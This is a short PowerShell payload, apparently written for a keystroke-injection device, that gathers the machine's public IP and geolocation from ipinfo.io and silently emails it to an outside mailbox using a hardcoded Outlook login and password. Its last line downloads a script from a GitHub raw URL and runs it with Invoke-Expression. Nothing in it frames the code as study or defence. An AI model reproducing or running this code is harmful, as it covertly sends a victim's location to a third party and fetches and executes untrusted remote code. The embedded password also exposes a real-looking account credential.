Try {
    $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
    $jsonContent = $ipInfo | ConvertTo-Json -Depth 10

    $SmtpServer = 'smtp-mail.outlook.com'
    $SmtpUser = 'usulmadhi@outlook.fr'
    $SmtpPass = 'Eusebe2000'  # Replace with app password if 2FA is enabled
    $Message = $jsonContent

    $MailMessage = New-Object System.Net.Mail.MailMessage
    $MailMessage.From = 'UsulMadhi@outlook.fr'
    $MailMessage.To.Add('UsulMadhi@proton.me')
    $MailMessage.Subject = 'Complete Geolocation Data'
    $MailMessage.Body = $Message

    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
    $SMTPClient.Send($MailMessage)
    Write-Host "Email sent successfully!"
}
Catch {
    Write-Host "Error sending email: $_"
}


STRING IEX ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CarpenterBruteforce/PowershellScripts/main/script.ps1'))
